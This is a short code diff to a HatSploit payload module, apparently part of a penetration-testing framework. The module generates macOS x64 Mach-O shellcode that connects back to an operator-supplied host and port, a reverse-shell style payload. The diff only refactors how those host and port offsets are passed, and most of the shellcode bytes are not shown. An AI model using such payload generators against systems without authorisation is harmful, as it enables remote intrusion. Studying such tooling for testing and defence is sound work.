@@ -68,6 +68,11 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
     def run(self):
         local_host, local_port = self.parse_options(self.options)
 
+        offsets = {
+            'lhost': local_host,
+            'lport': local_port
+        }
+
         self.output_process("Generating shellcode...")
         shellcode = (
             b":lhost:ip:"
@@ -75,6 +80,6 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate('macho', 'x64', shellcode, {'lhost': local_host, 'lport': local_port})
+        payload = self.generate('macho', 'x64', shellcode, offsets)
 
         return payload
